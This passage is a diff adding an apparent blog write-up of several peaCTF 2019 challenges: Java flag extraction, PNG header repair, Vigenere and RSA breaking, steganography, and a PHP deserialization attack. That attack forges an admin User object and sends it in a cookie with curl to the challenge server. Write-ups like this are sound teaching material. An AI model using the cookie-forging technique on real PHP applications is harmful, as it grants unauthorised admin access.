+      <span class="kt">int</span> <span class="n">secs</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)((</span><span class="n">timeend</span> <span class="o">-</span> <span class="n">timestart</span><span class="o">)</span> <span class="o">/</span> <span class="mf">5.0</span><span class="no">D</span><span class="o">);</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\nWhat is "</span> <span class="o">+</span> <span class="n">bigInteger</span> <span class="o">+</span> <span class="s">" to the power of 10000?"</span><span class="o">);</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"You have "</span> <span class="o">+</span> <span class="o">(</span><span class="n">secs</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="no">D</span><span class="o">)</span> <span class="o">+</span> <span class="s">" seconds to answer."</span><span class="o">);</span>
+      <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">secs</span><span class="o">);</span>
+      <span class="n">line</span> <span class="o">=</span> <span class="n">lineReader</span><span class="o">.</span><span class="na">readLine</span><span class="o">();</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\nPlease wait."</span><span class="o">);</span>
+      <span class="k">if</span> <span class="o">(</span><span class="n">line</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">toString</span><span class="o">()))</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">timeend</span> <span class="o">+</span> <span class="n">secs</span><span class="o">)</span> <span class="o">{</span>
+          <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Uh-oh, time's out."</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+          <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"peaCTF{nice_cup_of_coffee}"</span><span class="o">);</span>
+        <span class="o">}</span>
+      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Wrong answer, unfortunately."</span><span class="o">);</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>We can see the flag hardcoded into the code.</p>
+
+<p>Flag: <code class="highlighter-rouge">peaCTF{nice_cup_of_coffee}</code></p>
+
+<h1 id="we-are-extr">We are E.xtr</h1>
+
+<ul>
+  <li><strong>Category:</strong> Forensics</li>
+  <li><strong>Points:</strong> 350</li>
+</ul>
+
+<h3 id="challenge-7">Challenge</h3>
+
+<blockquote>
+  <p><a href="https://shell1.2019.peactf.com/static/0c54269f754b99bd071f40f8d5cbf1aa/E.xtr">E.xtr</a></p>
+
+  <p>Hints: Flag is formatted as {plain_text}</p>
+</blockquote>
+
+<h3 id="solution-7">Solution</h3>
+
+<p>We are given this weird file with a .xtr extension. Google doesn’t give us much. Running <code class="highlighter-rouge">file</code> against it tells us its just data.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» file E.xtr
+E.xtr: data
+</code></pre></div></div>
+
+<p>Using xxd, I checked the first few bytes of the file.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">xxd</span> <span class="n">E</span><span class="p">.</span><span class="n">xtr</span>
+<span class="mo">00000000</span><span class="o">:</span> <span class="mi">8958</span> <span class="mi">5452</span> <span class="mi">0</span><span class="n">d0a</span> <span class="mi">1</span><span class="n">a0a</span> <span class="mo">0000</span> <span class="mo">000</span><span class="n">d</span> <span class="mi">4948</span> <span class="mi">4452</span>  <span class="p">.</span><span class="n">XTR</span><span class="p">........</span><span class="n">IHDR</span>
+<span class="mo">00000010</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0500</span> <span class="mo">0000</span> <span class="mo">02</span><span class="n">d0</span> <span class="mi">0803</span> <span class="mo">0000</span> <span class="mo">01</span><span class="mi">8</span><span class="n">f</span> <span class="n">a41d</span>  <span class="p">................</span>
+<span class="mo">00000020</span><span class="o">:</span> <span class="n">f200</span> <span class="mo">0000</span> <span class="mo">0173</span> <span class="mi">5247</span> <span class="mi">4200</span> <span class="n">aece</span> <span class="mi">1</span><span class="n">ce9</span> <span class="mo">0000</span>  <span class="p">.....</span><span class="n">sRGB</span><span class="p">.......</span>
+<span class="mo">00000030</span><span class="o">:</span> <span class="mo">0004</span> <span class="mi">6741</span> <span class="mi">4</span><span class="n">d41</span> <span class="mo">0000</span> <span class="n">b18f</span> <span class="mi">0</span><span class="n">bfc</span> <span class="mi">6105</span> <span class="mo">0000</span>  <span class="p">..</span><span class="n">gAMA</span><span class="p">......</span><span class="n">a</span><span class="p">...</span>
+<span class="mo">00000040</span><span class="o">:</span> <span class="mo">0066</span> <span class="mi">504</span><span class="n">c</span> <span class="mi">5445</span> <span class="n">ffff</span> <span class="n">ffdf</span> <span class="n">dfdf</span> <span class="mi">7</span><span class="n">f7f</span> <span class="mi">7</span><span class="n">f40</span>  <span class="p">.</span><span class="n">fPLTE</span><span class="p">.........</span><span class="err">@</span>
+<span class="mo">00000050</span><span class="o">:</span> <span class="mi">4040</span> <span class="mi">2828</span> <span class="mi">2800</span> <span class="mo">0000</span> <span class="mi">1818</span> <span class="mi">1850</span> <span class="mi">5050</span> <span class="n">f7f7</span>  <span class="err">@@</span><span class="p">(((......</span><span class="n">PPP</span><span class="p">..</span>
+<span class="mo">00000060</span><span class="o">:</span> <span class="n">f7af</span> <span class="n">afaf</span> <span class="mi">9797</span> <span class="mi">9710</span> <span class="mi">1010</span> <span class="mi">6868</span> <span class="mf">68e7</span> <span class="n">e7e7</span>  <span class="p">..........</span><span class="n">hhh</span><span class="p">...</span>
+<span class="mo">00000070</span><span class="o">:</span> <span class="mi">2020</span> <span class="mi">2078</span> <span class="mi">7878</span> <span class="mi">9</span><span class="n">f9f</span> <span class="mi">9</span><span class="n">f08</span> <span class="mi">0808</span> <span class="n">bfbf</span> <span class="n">bf8f</span>     <span class="n">xxx</span><span class="p">..........</span>
+<span class="mo">000000</span><span class="mi">80</span><span class="o">:</span> <span class="mi">8</span><span class="n">f8f</span> <span class="n">c7c7</span> <span class="n">c7a7</span> <span class="n">a7a7</span> <span class="mi">7070</span> <span class="mi">7030</span> <span class="mi">3030</span> <span class="mi">6060</span>  <span class="p">........</span><span class="n">ppp000</span><span class="err">``</span>
+<span class="mo">000000</span><span class="mi">90</span><span class="o">:</span> <span class="mi">60</span><span class="n">cf</span> <span class="n">cfcf</span> <span class="n">b7b7</span> <span class="n">b758</span> <span class="mi">5858</span> <span class="mi">3838</span> <span class="mi">38</span><span class="n">ef</span> <span class="n">efef</span>  <span class="err">`</span><span class="p">......</span><span class="n">XXX888</span><span class="p">...</span>
+<span class="mo">000000</span><span class="n">a0</span><span class="o">:</span> <span class="n">d7d7</span> <span class="n">d748</span> <span class="mi">4848</span> <span class="mi">8787</span> <span class="mi">8700</span> <span class="mo">0000</span> <span class="mi">4</span><span class="n">dab</span> <span class="mo">042</span><span class="n">e</span>  <span class="p">...</span><span class="n">HHH</span><span class="p">......</span><span class="n">M</span><span class="p">...</span>
+<span class="mo">000000</span><span class="n">b0</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0022</span> <span class="mi">7452</span> <span class="mf">4e53</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span>  <span class="p">....</span><span class="n">tRNS</span><span class="p">........</span>
+<span class="mo">000000</span><span class="n">c0</span><span class="o">:</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span>  <span class="p">................</span>
+<span class="mo">000000</span><span class="n">d0</span><span class="o">:</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ffff</span> <span class="n">ff00</span> <span class="mi">0</span><span class="n">dd0</span> <span class="n">c371</span> <span class="mo">0000</span>  <span class="p">.............</span><span class="n">q</span><span class="p">..</span>
+<span class="mf">000000e0</span><span class="o">:</span> <span class="mo">000</span><span class="mi">9</span> <span class="mi">7048</span> <span class="mi">5973</span> <span class="mo">0000</span> <span class="mi">0</span><span class="n">ec3</span> <span class="mo">0000</span> <span class="mi">0</span><span class="n">ec3</span> <span class="mo">01</span><span class="n">c7</span>  <span class="p">..</span><span class="n">pHYs</span><span class="p">..........</span>
+</code></pre></div></div>
+
+<p>I know my file formats, and that looks an awful lot like PNG to me. I opened the file up in vim and just changed the ‘XTR’ to ‘PNG’ and opening up the file in an image viewer, we have the following.</p>
+
+<p><img src="/images/peactf/E.png" alt="E.png" height="250px" width="300px" /></p>
+
+<p>Flag: <code class="highlighter-rouge">{read_banned_it}</code></p>
+
+<h1 id="crack-the-key">Crack the Key</h1>
+
+<ul>
+  <li><strong>Category:</strong> Cryptography</li>
+  <li><strong>Points:</strong> 450</li>
+</ul>
+
+<h3 id="challenge-8">Challenge</h3>
+
+<blockquote>
+  <p>On one of my frequent walks through the woods, I stumbled upon this old French scroll with the title “le chiffre indéchiffrable.” Remember to submit as peaCTF{plaintext_key}. <a href="https://shell1.2019.peactf.com/static/a4836f4c3f6a10f05c2383a4486bd934/enc.txt">Ciphertext</a></p>
+
+  <p>Hints: The text is guaranteed to be in modern English with regular letter frequencies.</p>
+</blockquote>
+
+<h3 id="solution-8">Solution</h3>
+
+<p>Looking at the given ciphertext.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">cat</span> <span class="n">enc</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">DVMDVRWOUISIERRRGNNVMWPOPGTOHSBUIHTCSSMJIVUWEXHTCTKZKFXIENWTDDOVMEOWDZRQEBQPVLFWKJBGL</span>
+<span class="n">EEDALGCIVLQGLTWTCMFXSIAQTLTUGZQZZWOPVGIRCSLRUZRJUZBQSXSPXGJMGTPRPUGRSIVRGUDAFXHTNLVVBMF</span>
+<span class="n">ZMQSFUWTWTFSWHIGXHTQLGCUSRGLEIWWXXWWCJDAIFXGAPDWGWFHTZSVOBISITRVUTTVRTWTDGMCPHGGNRDB</span>
+<span class="n">POIZZWZPGHTTDQPHOYIUTUEWJDCPWORWDAZREDNHYSJZRJPAFSOCPDXZVPLVPGMNIWPFWUVRDUJINIDFXLYIUTE</span>
+<span class="n">NWAHITVJZRJPVQEFAJEXWIMQVIYPTWGZYYYXKTNNVMQJTPVZRJHEBVDWPOKGEIUDCAHDJGTRYKLHSILXHPIZPVDE</span>
+<span class="n">MDZGLEEGTDWDMGSTRAHXIPFGRVKPLUEDPHEVSEKHSZREMDCELWGVHKQBYSCXRLLRRGLQFLESIZGGDQXCQPETT</span>
+<span class="n">XEXGKLHDBUIRPCTQSCWLIPNHBTTYEYIIHSBUETIWPCKYSXALNPLBTPXAEXKTJVKBPGYEKJSRCIFQRYDYIKNEVHISILN</span>
+<span class="n">DFXGWXKTENCOASXEBFVVDPRAAHPWASPWFPTYIDIWZYYYXKTVNQEJCOIJNLLRPUIHPSMIWEIAWQOMTTSHEKNMOAQ</span>
+<span class="n">AKDDCMISLXBLIFWOWXRLDPVHVIEHESDYXZVJDGUGLAITGIJPSQTENWQJXEIJVEGNBBPOHTLRZFYUHAYIEEXYSJUIUI</span>
+<span class="n">WUIAGLSELYIKPLGSSPNLXGEIHCLBJTWTMMYSEUCWAESDGESXIELHMQTLPIQSJDQDYWEAAHPWVWRHBTVFGOCRPH</span>
+<span class="n">GELLHJRHOUHEVSNYQSMEELPCEIJEAKXKULUCVQVGDEETIZLELPDXOVPYTGRERHDWHSEHKPLYETTAJKJFAQGIGLEG</span>
+<span class="n">HESMKFXIPRAAHHEMDCEPPRRWTXRWSGBMQVXVKWXISEOZWHPVQFECTGSDVRWPXCIAGPYGWZRVEQGIOUISIXRG</span>
+<span class="n">WIPNXHXHEYKYIVWIQREKTCFWVRFJBOIFDGPPGEKWWMBXHTGLRADEOHJRKACIZEJIMYTIAHMPZPXZVQVTTIISRDXJGI</span>
+<span class="n">XDQTREFITCXZVMUSQSJEGTYXXRWKXWAWFXGDXURQHIPRXHGTPHGXWEACRFEAAUIKJMHPVQTICRSIJRRGIPRRTWT</span>
+<span class="n">AMYJAKDARXTATOHGNRLCBUISIGLAADQHSQNXEANTRXISQIWSXHTEWELWSUBBUIHTCDTWIGKTLGLEBHPPNVWRCBU</span>
+<span class="n">IWXCOSOJMOAAGLEEXRIGEWIACGXEGTOYHKSWWMEEFITCWLYIVWMRTACSNSOJPDNLBANQTSMFUXKTXVKSPCOFW</span>
+<span class="n">XEQIWPLELISIULHWWMGAORPCXZFVVTAOSXTGLRVTPRKMEGABTTRLFKHIPRVWPAVMFXZHGGFPOLAJEFUWHIBVRGS</span>
+<span class="n">DHRLYILGDNWTWPTVQYSRUAJMTWVCISKGDGMYISIISIJVWKDCYHBTHZQWJQDATNRIBPWGGEGHPTRHICISIKKVDLKYS</span>
+<span class="n">VTGHEKRWWDCGQOIWPVDPQDGMNTPGDLGZZRJBQQHLTATJWNLRWIQREKTCUMZXHVWGLEGUTKMIIEPKXEFITCLWIJ</span>
+<span class="n">RJZGLFDPWFGOIULIFENTCZVEFYVQMNWTCTLVDPILVPGIECWLRVJLLVPNRDPHDXJFRJPANRYILZSJUMQPZLLOGHPWH</span>
+<span class="n">LXWDORXHTGLAZZXHHBEMPTSZAFYMVCWFIGPKPLADEVDURAHPIDXMGMGPXCIAGPYGWRRGXVSECIWPASJRRIWSJI</span>
+<span class="n">GHEVSKILCBRPLXVPRUVFXIPRAAHJYMNVVVPTYCRTHAIUKIGUWELIHHEISUMQTAFSFRWLVSTXHGIAHTGTXIFUSXHXBA</span>
+<span class="n">EGHZJOFVNPNGIRIWPLGIWHHKNQEBJCMWCXKTEUMTTVZELRRGQMANABXYXZVHRCSRCBTCUEEZRZPAGLEDAOIKKE</span>
+<span class="n">QXUNPOCISIXRVPPVQXHTLZVKKXHBXRVESWPWWCHRBBNPKTSLRVNLHCPRHISXEASJYVJIYPYIDXECVWRBMPCNXRL</span>
+<span class="n">PJVQDGSSSRXCDXSEGHWMJSUASDEQKLDIOBHHPSRMNVRKXUNXAXAESCVISIPRJLXTDSXWFXIBUETWTHSMCHVDWA</span>
+<span class="n">IRWPGIZRHQDBNMLPCORGWPLTANPOCTLQGEKWWMNRIBPWWGEXKTNNVMWTYINVVOPCTLESXQEKBIGLPLLELDFPVJ</span>
+<span class="n">EBIPNXHTHLAFFXKXVTXOAPFKZRXQTDRVTWTWIKJALIPBYTDEPRDPEGBQGXICVTXZVADHLRZOITOXGSSATZGLEILZSX</span>
+<span class="n">KLHBCFYAAAJWHVRWIPRMRHJYHSPWWDORXHTGTRLYIVBIYPPPSOSUBFHNWAHTWTZVUYEUSOEEZXCRWAUIENAVH</span>
+<span class="n">EPCORWMIUHXREKXCR</span>
+</code></pre></div></div>
+
+<p>I just used <a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">this website</a> to get the key. You can always write your own tool to break this. The way I figured out it was a Vigenere cipher was partly trial and error, and partly the french in the challenge description.</p>
+
+<p>From the website, we get the following output.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Based on repetitions in the encrypted text, the most probable key length is 39 characters.
+
+Here is a list of the most probable keys based on frequency analysis of the letters in the cipher:
+
+Key #1: redpineapplesredpineapplesredpineatples
+Key #2: redpineapplesredpineapplesredpineatpleg
+...
+...
+</code></pre></div></div>
+
+<p>So I just guessed the key was “redpineapples”</p>
+
+<p>Flag: <code class="highlighter-rouge">peaCTF{redpineapples}</code></p>
+
+<h1 id="rsa">RSA</h1>
+
+<ul>
+  <li><strong>Category:</strong> Cryptography</li>
+  <li><strong>Points:</strong> 500</li>
+</ul>
+
+<h3 id="challenge-9">Challenge</h3>
+
+<blockquote>
+  <p>Can you help Bob retrieve the two messages for a flag? <a href="https://shell1.2019.peactf.com/static/894df24fe1495bddd441cad98558f7dc/auth_channel.txt">Authenticated Channel</a> <a href="https://shell1.2019.peactf.com/static/894df24fe1495bddd441cad98558f7dc/enc_channel.txt">Encrypted Channel</a></p>
+
+  <p>Hints: Convert decimal to hex. Flag is in the format of peaCTF{plaintext_key}</p>
+</blockquote>
+
+<h3 id="solution-9">Solution</h3>
+
+<p>Typical RSA challenge. We get given two files.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="n">cat</span> <span class="n">auth_channel</span><span class="p">.</span><span class="n">txt</span>   
+<span class="n">Authenticated</span> <span class="p">(</span><span class="n">unhashed</span><span class="p">)</span> <span class="n">channel</span><span class="o">:</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">59883006898206291499785811163190956754007806709157091648869</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">23731413167627600089782741107678182917228038671345300608183</span>
+<span class="o">----------------------------------------------------------------------------------</span>
+<span class="err">»</span> <span class="n">cat</span> <span class="n">enc_channel</span><span class="p">.</span><span class="n">txt</span>  
+<span class="n">Encrypted</span> <span class="n">channel</span><span class="o">:</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">165481207658568424313022356820498512502867488746572300093793</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">150635433712900935381157860417761227624682377134647578768653</span>
+</code></pre></div></div>
+
+<p>If you already know how RSA authentication works, you may skip the next couple paragraphs. If you are unfamiliar with RSA in general, I suggest <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">this link</a>.</p>
+
+<p>In RSA, if Person A wants to send a message to Person B, then Person A encrypts the message with Person B’s public key. Person B then decrypts the message with their private key. However, with this method, there is no way for Person B to verify that it was indeed Person A that sent them the message.</p>
+
+<p>The way authentication works, Person A will <strong><em>hash</em></strong> the entire message that they want to send, then encrypt that hash with their own (Person A’s) private key. They will send this encrypted hash along with the message (encrypted with Person B’s public key) to Person B. Person B can decrypt the message with their own private key. They can then decrypt the hash with Person A’s <strong>public</strong> key (since RSA is an asymmetric cipher). They can then hash the message themselves and compare the two hashes. If they match, then Person B knows for a fact that the message came from Person A, since only Person A has access to Person A’s private key.</p>
+
+<p>Now knowing all of that, we are told that the auth channel in this challenge is unhashed. We already have all the information required to decrypt the auth message since we just need to use the public key to decrypt it (which we already have). The script I used is the following.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">n</span> <span class="o">=</span> <span class="mi">59883006898206291499785811163190956754007806709157091648869</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">23731413167627600089782741107678182917228038671345300608183</span>
+<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">m_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="n">m_hex</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span> <span class="c1"># outputs '1ng1sfun}'
+</span></code></pre></div></div>
+
+<p>That gives us the second half of the flag. In order to get the first half, we have to decrypt the actual message sent in the enc message. If you are completely unfamiliar with how the RSA cryptosystem works, I suggest you read the wikipedia page linked above. I used <a href="http://factordb.com">factordb</a> to check if n was able to be factorized, and it turns out it is. I then wrote a simple script to calculate the private key and decrypt the message.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">inverse</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="mi">404796306518120759733507156677</span>
+<span class="n">q</span> <span class="o">=</span> <span class="mi">408801179738927870766525808109</span>
+<span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">150635433712900935381157860417761227624682377134647578768653</span>
+<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">m_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="n">m_hex</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span> <span class="c1"># outputs 'peaCTF{f4ct0r'
+</span></code></pre></div></div>
+
+<p>Combining the outputs, we get the flag.</p>
+
+<p>Flag: <code class="highlighter-rouge">peaCTF{f4ct0r1ng1sfun}</code></p>
+
+<h1 id="educated-guess">Educated Guess</h1>
+
+<ul>
+  <li><strong>Category:</strong> Web Exploitation</li>
+  <li><strong>Points:</strong> 600</li>
+</ul>
+
+<h3 id="challenge-10">Challenge</h3>
+
+<blockquote>
+  <p>There is a secured system running at <a href="http://shell1.2019.peactf.com:1428/query.php">http://shell1.2019.peactf.com:1428/query.php</a>. You have obtained the <a href="https://shell1.2019.peactf.com/static/112f0c66294260681ad5008f0b775684/query.phps">source code</a>.</p>
+
+  <p>Hints: Good programmers follow naming conventions.</p>
+</blockquote>
+
+<h3 id="solution-10">Solution</h3>
+
+<p>We are given a website link as well as the query.php file that the website apparently uses. The code is as follows.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Secured System<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="cp">&lt;?php</span>
+
+<span class="c1">// https://www.php-fig.org/psr/psr-4/</span>
+
+<span class="k">function</span> <span class="nf">autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">include</span> <span class="nv">$class</span> <span class="o">.</span> <span class="s1">'.class.php'</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nb">spl_autoload_register</span><span class="p">(</span><span class="s1">'autoload'</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$user</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">is_admin</span><span class="p">())</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'../flag'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">"Permission Denied"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"Not logged in."</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>It takes a cookie named ‘user’, first makes sure it’s not empty, then unserializes it, calls <code class="highlighter-rouge">$user-&gt;is_admin()</code> and gives us the flag only if it returns true. This tells me that the cookie is actually an object that is serialized and stored as the cookie (in its ‘value’ field).</p>
+
+<p>I used <a href="http://www.writephponline.com/">writephponline</a> to write my own class for this object. I had to make an ‘educated guess’ on how the <code class="highlighter-rouge">is_admin()</code> function worked as well as what the class field was called. My first guess of $admin turned out working. The hint of the challenge also helps a lot.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">User</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$admin</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">//the real class doesnt set it to true by default, but we want it to be true</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">is_admin</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$admin</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+
+<span class="c1"># Output = 'O:4:"User":1:{s:5:"admin";b:1;}'</span>
+</code></pre></div></div>
+
+<p>Then I url encoded output from above and used curl. Curl wouldn’t work without at least url encoding or escaping out the quotes and colons from the above output.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» curl <span class="nt">--cookie</span> <span class="s2">"user=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22admin%22%3Bb%3A1%3B%7D"</span> http://shell1.2019.peactf.com:1428/query.php
+&lt;<span class="o">!</span>doctype html&gt;
+&lt;html&gt;
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+    &lt;title&gt;Secured System&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+flag<span class="o">{</span>peactf_follow_conventions_4022940cb27774f618aa62fe8be202bc<span class="o">}</span>&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">flag{peactf_follow_conventions_4022940cb27774f618aa62fe8be202bc}</code></p>
+
+<h1 id="the-wonderful-wizard">The Wonderful Wizard</h1>
+
+<ul>
+  <li><strong>Category:</strong> Forensics</li>
+  <li><strong>Points:</strong> 750</li>
+</ul>
+
+<h3 id="challenge-11">Challenge</h3>
+
+<blockquote>
+  <p><a href="https://shell1.2019.peactf.com/static/90b725a83adb3db9ef2c64d9820374de/TheWonderfulWizard.png">TheWonderfulWizard.png</a></p>
+</blockquote>
+
+<h3 id="solution-11">Solution</h3>
+
+<p>We are given an image. First thing I always do is run stegsolve on images. I let stegsolve analyse it and then started scrolling through each of the different planes. Blue Plane 3 gave me this image.</p>
+
+<p><img src="/images/peactf/blue_plane_3.png" alt="blue_plane_3" height="250px" /></p>
+
+<p>I used python to decode the hex.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» python
+Python 2.7.16 <span class="o">(</span>default, Apr  6 2019, 01:42:57<span class="o">)</span>
+<span class="o">[</span>GCC 8.3.0] on linux2
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> a <span class="o">=</span> <span class="s2">"666c61677b706561637466"</span>
+<span class="o">&gt;&gt;&gt;</span> a +<span class="o">=</span> <span class="s2">"5f77686572655f7468655f"</span>
+<span class="o">&gt;&gt;&gt;</span> a +<span class="o">=</span> <span class="s2">"77696e645f626c6f77737d"</span>
+<span class="o">&gt;&gt;&gt;</span> print a.decode<span class="o">(</span><span class="s1">'hex'</span><span class="o">)</span>
+flag<span class="o">{</span>peactf_where_the_wind_blows<span class="o">}</span>
+<span class="o">&gt;&gt;&gt;</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">flag{peactf_where_the_wind_blows}</code></p>
+
+<h1 id="song-of-my-people">Song of My People</h1>
+
+<ul>
+  <li><strong>Category:</strong> Forensics</li>
+  <li><strong>Points:</strong> 800</li>
+</ul>
+
+<h3 id="challenge-12">Challenge</h3>
+
+<blockquote>
+  <p>A specific soundcloud rapper needs help getting into his password protected zipped file directory. The initial password is in the title. You just have to know your memes, and pick the right instrument! We were on the fence on giving you an image to go along with this puzzle, but the loincloth was too scandalous. Alternatively, you could bruteforce. <a href="https://shell1.2019.peactf.com/static/3fd6b2e03e0d3585c1b3d3fa19bfce87/song_of_my_people.zip">Song of My People</a></p>
+
+  <p>Hints: Flag is formatted as {plain_text}</p>
+</blockquote>
+
+<h3 id="solution-12">Solution</h3>
+
